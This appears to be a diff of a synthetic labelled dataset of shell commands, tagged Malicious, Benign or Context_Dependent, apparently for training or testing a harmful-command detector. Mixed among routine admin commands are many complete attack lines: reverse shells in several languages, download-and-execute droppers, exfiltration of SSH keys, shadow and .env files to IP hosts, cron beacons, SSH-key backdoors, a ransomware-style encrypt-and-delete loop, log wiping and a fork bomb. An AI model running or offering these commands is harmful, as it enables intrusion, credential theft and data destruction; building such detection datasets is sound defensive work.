+echo 'ssh-rsa AAAA... attacker' >> /root/.ssh/authorized_keys,Malicious,Synthetic,Synthetic
+cat /proc/net/fib_trie | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+',Malicious,Synthetic,Synthetic
+find /home -type f -name '*.doc' -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k ransomkey \; -exec rm {} \;,Malicious,Synthetic,Synthetic
+cat /etc/sysctl.conf,Benign,Synthetic,Synthetic
+cat /etc/group,Context_Dependent,Synthetic,Synthetic
+systemctl restart elasticsearch,Benign,Synthetic,Synthetic
+cp /home/user/server.js /home/user/server.js.bak,Benign,Synthetic,Synthetic
+base64 /root/.ssh/id_rsa | curl -d @- http://10.0.0.5:9090/,Malicious,Synthetic,Synthetic
+ls /var/log/,Benign,Synthetic,Synthetic
+curl -I https://internal-dns,Benign,Synthetic,Synthetic
+chown nginx:nginx /home/user,Benign,Synthetic,Synthetic
+ps aux | grep postgres,Benign,Synthetic,Synthetic
+head -20 /var/log/syslog,Benign,Synthetic,Synthetic
+git bisect start,Benign,Synthetic,Synthetic
+docker-compose logs -f,Benign,Synthetic,Synthetic
+yum update,Benign,Synthetic,Synthetic
+grep -c 'ERROR' /var/log/syslog,Benign,Synthetic,Synthetic
+curl http://10.20.30.40:443/rev.py | bash,Malicious,Synthetic,Synthetic
+cp config.yaml config.yaml.bak,Benign,Synthetic,Synthetic
+cat /etc/sudoers | nc 172.16.5.10 1234,Malicious,Synthetic,Synthetic
+crontab -e,Benign,Synthetic,Synthetic
+journalctl -u rsyslog --since '1 hour ago',Benign,Synthetic,Synthetic
+pip show gunicorn,Benign,Synthetic,Synthetic
+netstat -tlnp,Benign,Synthetic,Synthetic
+kill -9 1,Context_Dependent,Synthetic,Synthetic
+git add .,Benign,Synthetic,Synthetic
+du -ah /etc/nginx | sort -rh | head -10,Benign,Synthetic,Synthetic
+cargo update,Benign,Synthetic,Synthetic
+curl http://172.16.5.10:80/dropper | bash,Malicious,Synthetic,Synthetic
+cat /etc/shadow,Context_Dependent,Synthetic,Synthetic
+mv /srv/www/requirements.txt.old /srv/www/requirements.txt,Benign,Synthetic,Synthetic
+curl -s https://ifconfig.me,Benign,Synthetic,Synthetic
+echo '/tmp/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.20.30.40 9090 >/tmp/f,Malicious,Synthetic,Synthetic
+nano /opt/services/server.js,Benign,Synthetic,Synthetic
+ping6 -c 2 ::1,Benign,Synthetic,Synthetic
+cat /var/www/html/.env,Malicious,Synthetic,Synthetic
+history -c && history -w,Malicious,Synthetic,Synthetic
+ssh -L 8080:localhost:8080 user@jump,Context_Dependent,Synthetic,Synthetic
+cp /srv/www/requirements.txt /srv/www/requirements.txt.bak,Benign,Synthetic,Synthetic
+journalctl -u haproxy --no-pager -n 20,Benign,Synthetic,Synthetic
+ausearch -m avc -ts recent,Benign,Synthetic,Synthetic
+LD_PRELOAD=/tmp/libevil.so /usr/bin/sudo,Malicious,Synthetic,Synthetic
+date,Benign,Synthetic,Synthetic
+ssh ubuntu@web-01,Benign,Synthetic,Synthetic
+history -c,Benign,Synthetic,Synthetic
+ls -la /var/www/,Benign,Synthetic,Synthetic
+cat /etc/shadow | nc 10.0.0.1 9999,Malicious,Synthetic,Synthetic
+cat /etc/master.passwd,Malicious,Synthetic,Synthetic
+docker logs api,Benign,Synthetic,Synthetic
+nikto -h http://10.0.0.25:80,Context_Dependent,Synthetic,Synthetic
+mv /srv/www/app.py.old /srv/www/app.py,Benign,Synthetic,Synthetic
+"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",Malicious,Synthetic,Synthetic
+chmod u+s /bin/bash,Malicious,Synthetic,Synthetic
+cat ~/.bashrc,Benign,Synthetic,Synthetic
+:(){ :|:& };:,Malicious,Synthetic,Synthetic
+umask 022,Benign,Synthetic,Synthetic
+wget http://10.10.14.3:9090/shell.sh -O /run/shm/shell.sh && chmod +x /run/shm/shell.sh && /run/shm/shell.sh,Malicious,Synthetic,Synthetic
+nc -e /bin/bash 192.168.1.100 9001,Malicious,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 1337 >/tmp/f,Malicious,Synthetic,Synthetic
+true,Benign,Synthetic,Synthetic
+gradle test,Benign,Synthetic,Synthetic
+pip install next,Benign,Synthetic,Synthetic
+mv /usr/local/bin/requirements.txt.old /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
+chown root:root /home/user,Benign,Synthetic,Synthetic
+cat ~/.mysql_history,Context_Dependent,Synthetic,Synthetic
+du -ah /usr/local/bin | sort -rh | head -10,Benign,Synthetic,Synthetic
+cp /var/lib/docker-compose.yml /var/lib/docker-compose.yml.bak,Benign,Synthetic,Synthetic
+sha256sum -c checksums.txt,Benign,Synthetic,Synthetic
+docker-compose restart web,Benign,Synthetic,Synthetic
+grep -v '^#' /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
+scp -r project/ user@server:/opt/,Benign,Synthetic,Synthetic
+du -sh /home/user,Benign,Synthetic,Synthetic
+sha256sum release.zip,Benign,Synthetic,Synthetic
+cat /etc/passwd | nc 10.0.0.1 9999,Malicious,Synthetic,Synthetic
+ssh -i ~/.ssh/id_rsa user@server,Benign,Synthetic,Synthetic
+systemctl restart memcached,Benign,Synthetic,Synthetic
+cat /proc/version,Benign,Synthetic,Synthetic
+tar czf - /etc/ssh/ | curl -X POST -d @- http://10.0.0.1:8080/,Malicious,Synthetic,Synthetic
+service --status-all,Benign,Synthetic,Synthetic
+systemctl restart consul,Benign,Synthetic,Synthetic
+grep -v '^#' /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
+pip install --upgrade pandas,Benign,Synthetic,Synthetic
+kubectl apply -f deployment.yaml,Benign,Synthetic,Synthetic
+cat /etc/nsswitch.conf,Benign,Synthetic,Synthetic
+find /var/log -name '*.log' -exec truncate -s 0 {} \;,Malicious,Synthetic,Synthetic
+"ruby -rsocket -e 'f=TCPSocket.open(""10.0.0.1"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Malicious,Synthetic,Synthetic
+nmap -sV 192.168.0.10,Context_Dependent,Synthetic,Synthetic
+pip show boto3,Benign,Synthetic,Synthetic
+nmap -sT 10.0.0.0/24,Context_Dependent,Synthetic,Synthetic
+zcat /var/log/syslog.1.gz | tail -20,Benign,Synthetic,Synthetic
+find . -name '*.pyc' -delete,Benign,Synthetic,Synthetic
+nano /home/admin/Dockerfile,Benign,Synthetic,Synthetic
+ls -lt /usr/local/bin | head -10,Benign,Synthetic,Synthetic
+pip install fastapi,Benign,Synthetic,Synthetic
+vim /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
+git gc,Benign,Synthetic,Synthetic
+docker exec -it api bash,Benign,Synthetic,Synthetic
+tail -100 /var/log/messages,Benign,Synthetic,Synthetic
+who,Benign,Synthetic,Synthetic
+docker system prune -f,Benign,Synthetic,Synthetic
+systemctl is-active httpd,Benign,Synthetic,Synthetic
+chown -R nginx:nginx /home/user,Benign,Synthetic,Synthetic
+systemctl is-active redis,Benign,Synthetic,Synthetic
+chmod 4755 /usr/local/bin/tool,Context_Dependent,Synthetic,Synthetic
+nano /var/www/html/settings.json,Benign,Synthetic,Synthetic
+cp /srv/www/nginx.conf /srv/www/nginx.conf.bak,Benign,Synthetic,Synthetic
+vim /tmp/README.md,Benign,Synthetic,Synthetic
+pip install --upgrade setuptools,Benign,Synthetic,Synthetic
+curl -s http://172.16.0.50/implant -o /tmp/.hidden/.implant && bash /tmp/.hidden/.implant,Malicious,Synthetic,Synthetic
+systemctl list-timers,Benign,Synthetic,Synthetic
+"ansible all -i '10.0.0.2,' -m shell -a 'curl http://10.0.0.1/shell|bash'",Malicious,Synthetic,Synthetic
+"socat TCP-LISTEN:1234,fork -",Context_Dependent,Synthetic,Synthetic
+du -sh /var/lib,Benign,Synthetic,Synthetic
+pip install uvicorn,Benign,Synthetic,Synthetic
+cat /opt/app/.env,Malicious,Synthetic,Synthetic
+journalctl -u mysql --since '1 hour ago',Benign,Synthetic,Synthetic
+ls /usr/local/bin/,Benign,Synthetic,Synthetic
+cp /home/deploy/deploy.sh /home/deploy/deploy.sh.bak,Benign,Synthetic,Synthetic
+pip install --upgrade webpack,Benign,Synthetic,Synthetic
+nmap -sT 192.168.1.0/24,Context_Dependent,Synthetic,Synthetic
+journalctl -u prometheus --since '1 hour ago',Benign,Synthetic,Synthetic
+iotop -bon1,Benign,Synthetic,Synthetic
+grep -ri 'token' /opt/,Context_Dependent,Synthetic,Synthetic
+nano /srv/www/backup.sh,Benign,Synthetic,Synthetic
+ls -la /dev/shm/,Context_Dependent,Synthetic,Synthetic
+echo '/tmp/.persist' >> ~/.bashrc,Malicious,Synthetic,Synthetic
+nano /home/user/projects/server.js,Benign,Synthetic,Synthetic
+ls -la /srv/www,Benign,Synthetic,Synthetic
+base64 /root/.ssh/id_rsa | curl -d @- http://192.168.1.100:1337/,Malicious,Synthetic,Synthetic
+echo $HOME,Benign,Synthetic,Synthetic
+mv /var/lib/main.go.old /var/lib/main.go,Benign,Synthetic,Synthetic
+git diff --staged,Benign,Synthetic,Synthetic
+ss -s,Benign,Synthetic,Synthetic
+npm install express,Benign,Synthetic,Synthetic
+netstat -anp | grep LISTEN,Benign,Synthetic,Synthetic
+ip neigh show,Benign,Synthetic,Synthetic
+ls -la /home/user,Benign,Synthetic,Synthetic
+last -5,Benign,Synthetic,Synthetic
+gradle build,Benign,Synthetic,Synthetic
+cat /etc/resolv.conf,Benign,Synthetic,Synthetic
+env | grep -i key,Context_Dependent,Synthetic,Synthetic
+ssh admin@web-01 'uptime',Benign,Synthetic,Synthetic
+nano /home/user/monitor.py,Benign,Synthetic,Synthetic
+python -m SimpleHTTPServer 9000,Context_Dependent,Synthetic,Synthetic
+pip show celery,Benign,Synthetic,Synthetic
+ss -tlnp,Benign,Synthetic,Synthetic
+chown deploy:deploy /home/user/projects,Benign,Synthetic,Synthetic
+md5sum release.zip,Benign,Synthetic,Synthetic
+grep -ri 'api_key' /var/www/,Context_Dependent,Synthetic,Synthetic
+grep -ri 'secret' /opt/,Context_Dependent,Synthetic,Synthetic
+curl -s http://10.0.0.1/payload.sh,Context_Dependent,Synthetic,Synthetic
+pip install webpack,Benign,Synthetic,Synthetic
+wget http://10.100.200.1:8080/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh,Malicious,Synthetic,Synthetic
+journalctl -u kibana --since '1 hour ago',Benign,Synthetic,Synthetic
+top -bn1 | head -20,Benign,Synthetic,Synthetic
+ssh admin@staging 'uptime',Benign,Synthetic,Synthetic
+systemctl restart mysql,Benign,Synthetic,Synthetic
+ls -la /root/,Context_Dependent,Synthetic,Synthetic
+pip3 install django gunicorn,Benign,Synthetic,Synthetic
+bash -i >& /dev/tcp/192.168.1.100/9090 0>&1,Malicious,Synthetic,Synthetic
+kill -HUP $(pidof postgres),Benign,Synthetic,Synthetic
+nc -zv 172.16.5.10 1-1000,Context_Dependent,Synthetic,Synthetic
+journalctl -u redis --since '1 hour ago',Benign,Synthetic,Synthetic
+vim /home/user/server.js,Benign,Synthetic,Synthetic
+cat /proc/net/arp,Context_Dependent,Synthetic,Synthetic
+df -h /var/www/html,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:4444,reuseaddr,fork -",Context_Dependent,Synthetic,Synthetic
+du -sh /home/deploy,Benign,Synthetic,Synthetic
+groups $USER,Benign,Synthetic,Synthetic
+iconv -f UTF-8 -t ASCII input.txt,Benign,Synthetic,Synthetic
+nc -zv 192.168.1.100 80,Context_Dependent,Synthetic,Synthetic
+mv /home/user/healthcheck.sh.old /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
+journalctl -u rabbitmq-server --no-pager -n 20,Benign,Synthetic,Synthetic
+ls -lt /var/www/html | head -10,Benign,Synthetic,Synthetic
+chmod 644 package.json,Benign,Synthetic,Synthetic
+"lua -e 'local s=require(""socket"");local t=assert(s.tcp());t:connect(""10.0.0.1"",4444);os.execute(""/bin/sh -i <&3 >&3 2>&3"")'",Malicious,Synthetic,Synthetic
+insmod /tmp/rootkit.ko,Malicious,Synthetic,Synthetic
+git cherry-pick abc1234,Benign,Synthetic,Synthetic
+nano /srv/www/requirements.txt,Benign,Synthetic,Synthetic
+grep -c 'WARN' /var/log/syslog,Benign,Synthetic,Synthetic
+timedatectl,Benign,Synthetic,Synthetic
+make,Benign,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://10.0.0.1/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+dd if=/dev/zero of=/tmp/testfile bs=1M count=100,Benign,Synthetic,Synthetic
+grep -r password /etc/,Context_Dependent,Synthetic,Synthetic
+shred -zu /var/log/auth.log,Malicious,Synthetic,Synthetic
+gunzip access.log.gz,Benign,Synthetic,Synthetic
+ssh deploy@production 'uptime',Benign,Synthetic,Synthetic
+mv /var/log/package.json.old /var/log/package.json,Benign,Synthetic,Synthetic
+wget http://10.10.14.3:9090/rev.py -O /tmp/rev.py && chmod +x /tmp/rev.py && /tmp/rev.py,Malicious,Synthetic,Synthetic
+sftp -b batchfile user@server,Benign,Synthetic,Synthetic
+kubectl rollout status deployment/web,Benign,Synthetic,Synthetic
+sha256sum package.deb,Benign,Synthetic,Synthetic
+python3 -m pytest tests/,Benign,Synthetic,Synthetic
+getent group $USER,Benign,Synthetic,Synthetic
+mv /tmp/README.md.old /tmp/README.md,Benign,Synthetic,Synthetic
+grep -i 'refused' /var/log/syslog,Benign,Synthetic,Synthetic
+evil-winrm -i 10.0.0.2 -u admin -p password,Malicious,Synthetic,Synthetic
+vim /srv/www/app.py,Benign,Synthetic,Synthetic
+dmidecode -t system,Benign,Synthetic,Synthetic
+nc -lvnp 6666,Context_Dependent,Synthetic,Synthetic
+nano /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
+cat /etc/fstab | grep -v '^#',Malicious,Synthetic,Synthetic
+docker images -a,Benign,Synthetic,Synthetic
+grep -i 'timeout' /var/log/syslog,Benign,Synthetic,Synthetic
+/proc/1234/status,Benign,Synthetic,Synthetic
+kubectl logs web-abc123,Benign,Synthetic,Synthetic
+vim /opt/services/settings.json,Benign,Synthetic,Synthetic
+systemctl is-active kibana,Benign,Synthetic,Synthetic
+date +%s,Benign,Synthetic,Synthetic
+mtr --report google.com,Benign,Synthetic,Synthetic
+cat ~/.profile,Benign,Synthetic,Synthetic
+journalctl -u grafana-server --since '1 hour ago',Benign,Synthetic,Synthetic
+tcpdump -i any -c 100 -nn,Context_Dependent,Synthetic,Synthetic
+pip show typescript,Benign,Synthetic,Synthetic
+cp /tmp/Makefile /tmp/Makefile.bak,Benign,Synthetic,Synthetic
+nohup ./monitor.sh &,Context_Dependent,Synthetic,Synthetic
+grep -c 'refused' /var/log/syslog,Benign,Synthetic,Synthetic
+realpath ./relative/path,Benign,Synthetic,Synthetic
+pip show next,Benign,Synthetic,Synthetic
+nano /usr/local/bin/requirements.txt,Benign,Synthetic,Synthetic
+strace -c ls /tmp,Benign,Synthetic,Synthetic
+curl -I https://8.8.8.8,Benign,Synthetic,Synthetic
+tmux new -s work,Benign,Synthetic,Synthetic
+find / -name '*.kdbx' 2>/dev/null,Malicious,Synthetic,Synthetic
+dirb http://target.com,Context_Dependent,Synthetic,Synthetic
+python3 -m http.server 8080,Context_Dependent,Synthetic,Synthetic
+du -ah /opt/app | sort -rh | head -10,Benign,Synthetic,Synthetic
+find / -xdev -type f -size +100M,Benign,Synthetic,Synthetic
+nmcli general status,Benign,Synthetic,Synthetic
+python3 -m http.server 80,Context_Dependent,Synthetic,Synthetic
+docker-compose ps,Benign,Synthetic,Synthetic
+lsusb,Benign,Synthetic,Synthetic
+uptime -p,Benign,Synthetic,Synthetic
+cat /proc/1/environ,Context_Dependent,Synthetic,Synthetic
+echo 'c' > /proc/sysrq-trigger,Malicious,Synthetic,Synthetic
+ps aux | grep node,Benign,Synthetic,Synthetic
+du -ah /var/www/html | sort -rh | head -10,Benign,Synthetic,Synthetic
+journalctl -u nginx --since '1 hour ago',Benign,Synthetic,Synthetic
+iwconfig,Benign,Synthetic,Synthetic
+systemctl restart prometheus,Benign,Synthetic,Synthetic
+mv /tmp/docker-compose.yml.old /tmp/docker-compose.yml,Benign,Synthetic,Synthetic
+cp /home/user/projects/config.yaml /home/user/projects/config.yaml.bak,Benign,Synthetic,Synthetic
+echo $USER,Benign,Synthetic,Synthetic
+journalctl -u consul --since '1 hour ago',Benign,Synthetic,Synthetic
+mv /var/www/monitor.py.old /var/www/monitor.py,Benign,Synthetic,Synthetic
+cp /home/user/monitor.py /home/user/monitor.py.bak,Benign,Synthetic,Synthetic
+git status,Benign,Synthetic,Synthetic
+ls -lt /home/deploy | head -10,Benign,Synthetic,Synthetic
+cp /var/www/html/backup.sh /var/www/html/backup.sh.bak,Benign,Synthetic,Synthetic
+lsof +D /var/log,Benign,Synthetic,Synthetic
+curl --data-binary @/root/.ssh/id_rsa http://10.0.0.1:9090/keys,Malicious,Synthetic,Synthetic
+docker logs -f app,Benign,Synthetic,Synthetic
+bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1',Malicious,Synthetic,Synthetic
+ls -lt /tmp | head -10,Benign,Synthetic,Synthetic
+hostnamectl,Benign,Synthetic,Synthetic
+systemctl daemon-reload,Benign,Synthetic,Synthetic
+apt list --installed,Benign,Synthetic,Synthetic
+anacron -T,Benign,Synthetic,Synthetic
+vim /var/log/index.html,Benign,Synthetic,Synthetic
+arp -a,Benign,Synthetic,Synthetic
+mv /var/log/config.yaml.old /var/log/config.yaml,Benign,Synthetic,Synthetic
+mv /var/www/nginx.conf.old /var/www/nginx.conf,Benign,Synthetic,Synthetic
+cp /var/log/config.yaml /var/log/config.yaml.bak,Benign,Synthetic,Synthetic
+mv /opt/app/Dockerfile.old /opt/app/Dockerfile,Benign,Synthetic,Synthetic
+dnf update,Benign,Synthetic,Synthetic
+chmod 600 healthcheck.sh,Benign,Synthetic,Synthetic
+grep -ri 'secret' /etc/,Context_Dependent,Synthetic,Synthetic
+wget http://10.20.30.40:443/rev.py -O /tmp/.hidden/rev.py && chmod +x /tmp/.hidden/rev.py && /tmp/.hidden/rev.py,Malicious,Synthetic,Synthetic
+brew upgrade,Benign,Synthetic,Synthetic
+pypykatz lsa minidump lsass.dmp,Malicious,Synthetic,Synthetic
+lsof -i -P -n | grep LISTEN,Benign,Synthetic,Synthetic
+groupdel testgroup,Benign,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://172.16.0.1/9001/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+systemctl restart fail2ban,Benign,Synthetic,Synthetic
+nslookup google.com,Benign,Synthetic,Synthetic
+curl http://10.100.200.1:8080/payload.sh | bash,Malicious,Synthetic,Synthetic
+"lsblk -o NAME,SIZE,TYPE,MOUNTPOINT",Benign,Synthetic,Synthetic
+lsb_release -a,Benign,Synthetic,Synthetic
+cat /proc/loadavg,Benign,Synthetic,Synthetic
+python -m SimpleHTTPServer 8000,Context_Dependent,Synthetic,Synthetic
+curl -s http://10.20.30.40/rev.py -o /tmp/.hidden/.rev.py && bash /tmp/.hidden/.rev.py,Malicious,Synthetic,Synthetic
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.100"",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
+ls /opt/app/,Benign,Synthetic,Synthetic
+systemctl is-active nomad,Benign,Synthetic,Synthetic
+cmake ..,Benign,Synthetic,Synthetic
+unalias ll,Benign,Synthetic,Synthetic
+getent passwd $USER,Benign,Synthetic,Synthetic
+nano /opt/app/Dockerfile,Benign,Synthetic,Synthetic
+pgrep -la sshd,Benign,Synthetic,Synthetic
+docker exec -it db bash,Benign,Synthetic,Synthetic
+dig internal-dns,Benign,Synthetic,Synthetic
+find . -name '*.py' -type f,Benign,Synthetic,Synthetic
+cp /opt/services/deploy.sh /opt/services/deploy.sh.bak,Benign,Synthetic,Synthetic
+du -sh /opt/app,Benign,Synthetic,Synthetic
+mvn clean install,Benign,Synthetic,Synthetic
+cat /opt/app/.env | nc 10.20.30.40 1337,Malicious,Synthetic,Synthetic
+cat /proc/self/environ,Context_Dependent,Synthetic,Synthetic
+cp /dev/shm/.proc/backdoor /usr/local/bin/.update && chmod +x /usr/local/bin/.update,Malicious,Synthetic,Synthetic
+curl http://172.16.0.50:8443/implant | bash,Malicious,Synthetic,Synthetic
+nano /etc/nginx/monitor.py,Benign,Synthetic,Synthetic
+systemctl restart vault,Benign,Synthetic,Synthetic
+nc -lvnp 9090,Context_Dependent,Synthetic,Synthetic
+mv /var/lib/package.json.old /var/lib/package.json,Benign,Synthetic,Synthetic
+ssh admin@app-01 'uptime',Benign,Synthetic,Synthetic
+ssh ubuntu@db-01,Benign,Synthetic,Synthetic
+ping -c 4 api.company.com,Benign,Synthetic,Synthetic
+du -sh /usr/local/bin,Benign,Synthetic,Synthetic
+nmcli device status,Benign,Synthetic,Synthetic
+chmod 644 README.md,Benign,Synthetic,Synthetic
+ls -laR /etc/nginx/,Benign,Synthetic,Synthetic
+hostname -s,Benign,Synthetic,Synthetic
+git tag -l 'v*',Benign,Synthetic,Synthetic
+systemctl status cron,Benign,Synthetic,Synthetic
+systemctl restart docker,Benign,Synthetic,Synthetic
+"awk 'BEGIN {s = ""/inet/tcp/0/10.0.0.1/4444""; while(42) { printf ""> "" |& s; s |& getline c; if (c) { while ((c |& getline line) > 0) print line |& s; close(c) } } }'",Malicious,Synthetic,Synthetic
+openssl enc -aes-256-cbc -in file.txt -out file.enc,Context_Dependent,Synthetic,Synthetic
+sshpass -p 'password123' ssh root@10.0.0.2,Malicious,Synthetic,Synthetic
+ls /var/lib/,Benign,Synthetic,Synthetic
+kill -HUP 1234,Benign,Synthetic,Synthetic
+iptables -L -v --line-numbers,Benign,Synthetic,Synthetic
+ip addr,Benign,Synthetic,Synthetic
+g++ -std=c++17 -o app app.cpp,Benign,Synthetic,Synthetic
+wget http://172.16.5.10:443/implant -O /tmp/implant && chmod +x /tmp/implant && /tmp/implant,Malicious,Synthetic,Synthetic
+grep -ri 'token' /home/,Context_Dependent,Synthetic,Synthetic
+journalctl -u sshd --since '1 hour ago',Benign,Synthetic,Synthetic
+python3 manage.py migrate,Benign,Synthetic,Synthetic
+stat /var/log/syslog,Benign,Synthetic,Synthetic
+cat /etc/default/grub,Benign,Synthetic,Synthetic
+df -h /opt/app,Benign,Synthetic,Synthetic
+unzip archive.zip -d /tmp/output,Benign,Synthetic,Synthetic
+chown www-data:www-data /opt/services,Benign,Synthetic,Synthetic
+kubectl top nodes,Benign,Synthetic,Synthetic
+su - postgres,Benign,Synthetic,Synthetic
+lsof -i :80,Benign,Synthetic,Synthetic
+ping -c 4 google.com,Benign,Synthetic,Synthetic
+docker logs cache,Benign,Synthetic,Synthetic
+nano /srv/www/Makefile,Benign,Synthetic,Synthetic
+docker logs --tail 100 api,Benign,Synthetic,Synthetic
+systemctl status consul,Benign,Synthetic,Synthetic
+nano /var/log/package.json,Benign,Synthetic,Synthetic
+wget -q -O - https://example.com | head -1,Benign,Synthetic,Synthetic
+systemctl restart redis,Benign,Synthetic,Synthetic
+kubectl top pods,Benign,Synthetic,Synthetic
+cp /home/deploy/requirements.txt /home/deploy/requirements.txt.bak,Benign,Synthetic,Synthetic
+hostnamectl status,Benign,Synthetic,Synthetic
+ncat -lvnp 7777,Context_Dependent,Synthetic,Synthetic
+mkdir -p ~/.ssh && echo 'ssh-rsa AAAA... attacker@host' >> ~/.ssh/authorized_keys,Malicious,Synthetic,Synthetic
+nc -w 3 host 9999,Context_Dependent,Synthetic,Synthetic
+ls -lt /home/user | head -10,Benign,Synthetic,Synthetic
+"socat TCP-LISTEN:7777,fork -",Context_Dependent,Synthetic,Synthetic
+ss -a,Benign,Synthetic,Synthetic
+"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.50"",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
+"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",Malicious,Synthetic,Synthetic
+pip show lodash,Benign,Synthetic,Synthetic
+nano /var/log/index.html,Benign,Synthetic,Synthetic
+journalctl -u httpd --since '1 hour ago',Benign,Synthetic,Synthetic
+systemctl is-active fail2ban,Benign,Synthetic,Synthetic
+base64 /etc/passwd | curl -d @- http://10.0.0.5:8080/,Malicious,Synthetic,Synthetic
+docker logs -f proxy,Benign,Synthetic,Synthetic
+nc -zv 192.168.1.100 22,Context_Dependent,Synthetic,Synthetic
+journalctl -u nginx,Benign,Synthetic,Synthetic
+history | tail -20,Benign,Synthetic,Synthetic
+pgrep -la nginx,Benign,Synthetic,Synthetic
+chmod 700 app.py,Benign,Synthetic,Synthetic
+openssl version,Benign,Synthetic,Synthetic
+cat /etc/passwd,Context_Dependent,Synthetic,Synthetic
+at now + 5 minutes,Benign,Synthetic,Synthetic
+nmap -sV 192.168.1.1,Context_Dependent,Synthetic,Synthetic
+systemctl is-active cron,Benign,Synthetic,Synthetic
+yq '.services' docker-compose.yml,Benign,Synthetic,Synthetic
+nc -zv 172.16.5.10 80,Context_Dependent,Synthetic,Synthetic
+(crontab -l; echo '*/5 * * * * curl http://172.16.0.50/5555/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
+psexec.py admin:password@10.0.0.2,Malicious,Synthetic,Synthetic
+cp /opt/services/README.md /opt/services/README.md.bak,Benign,Synthetic,Synthetic
+who -r,Benign,Synthetic,Synthetic
+systemctl stop apache2,Benign,Synthetic,Synthetic
+tcpdump -i eth0 -w capture.pcap,Context_Dependent,Synthetic,Synthetic
+ls -la /etc/nginx,Benign,Synthetic,Synthetic
+uptime -s,Benign,Synthetic,Synthetic
+systemctl is-active consul,Benign,Synthetic,Synthetic
+md5sum firmware.bin,Benign,Synthetic,Synthetic
+nmap -sV 192.168.1.50,Context_Dependent,Synthetic,Synthetic
+command -v docker,Benign,Synthetic,Synthetic
+docker exec -it worker bash,Benign,Synthetic,Synthetic
+cp /tmp/main.go /tmp/main.go.bak,Benign,Synthetic,Synthetic
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 1234 >/tmp/f,Malicious,Synthetic,Synthetic
+pip install --upgrade express,Benign,Synthetic,Synthetic
+echo 'backdoor:password123' | chpasswd,Malicious,Synthetic,Synthetic
+mv /srv/www/Makefile.old /srv/www/Makefile,Benign,Synthetic,Synthetic
+git branch -d old-branch,Benign,Synthetic,Synthetic
+python3 LaZagne.py all,Malicious,Synthetic,Synthetic
+lsblk,Benign,Synthetic,Synthetic
+nano /opt/services/settings.json,Benign,Synthetic,Synthetic
+chown root:root /etc/nginx/nginx.conf,Benign,Synthetic,Synthetic
+ls -la /home/admin,Benign,Synthetic,Synthetic
+ssh admin@staging,Benign,Synthetic,Synthetic
+"python -c 'import os,pty,socket;s=socket.socket();s.connect((""10.0.0.1"",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(""/bin/bash"")'",Malicious,Synthetic,Synthetic
+curl -s http://10.100.200.1/rev.py -o /tmp/.hidden/.rev.py && bash /tmp/.hidden/.rev.py,Malicious,Synthetic,Synthetic
+mv /var/www/index.html.old /var/www/index.html,Benign,Synthetic,Synthetic
+chown -R root:root /var/www,Benign,Synthetic,Synthetic
+conda env list,Benign,Synthetic,Synthetic
+cp /opt/app/Dockerfile /opt/app/Dockerfile.bak,Benign,Synthetic,Synthetic
+cat /etc/security/limits.conf,Benign,Synthetic,Synthetic
+sudo cat /var/log/auth.log,Benign,Synthetic,Synthetic
+ls -lt /var/lib | head -10,Benign,Synthetic,Synthetic
+pgrep -la redis,Benign,Synthetic,Synthetic
+cmake --build .,Benign,Synthetic,Synthetic
+systemctl is-active memcached,Benign,Synthetic,Synthetic
+w,Benign,Synthetic,Synthetic
+nano /var/www/html/backup.sh,Benign,Synthetic,Synthetic
+"perl -e 'use Socket;$i=""172.16.0.1"";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'",Malicious,Synthetic,Synthetic
+make clean,Benign,Synthetic,Synthetic
+nc -lvnp 8443,Context_Dependent,Synthetic,Synthetic
+fc -l -10,Benign,Synthetic,Synthetic
+cp /tmp/README.md /tmp/README.md.bak,Benign,Synthetic,Synthetic
+ssh -L 6379:localhost:6379 user@jump,Context_Dependent,Synthetic,Synthetic
+vim /home/deploy/healthcheck.sh,Benign,Synthetic,Synthetic
+watch -n 2 'df -h',Benign,Synthetic,Synthetic
+cat /root/.ssh/id_rsa | nc 10.0.0.5 9090,Malicious,Synthetic,Synthetic
+cat /proc/1234/fd,Benign,Synthetic,Synthetic
+ls -lah /opt/services,Benign,Synthetic,Synthetic
+nm /usr/lib/libc.so | head,Benign,Synthetic,Synthetic
+ssh deploy@staging,Benign,Synthetic,Synthetic
+openssl s_client -connect example.com:443 </dev/null,Benign,Synthetic,Synthetic
+ip link,Benign,Synthetic,Synthetic
+cat ~/.ssh/config,Benign,Synthetic,Synthetic
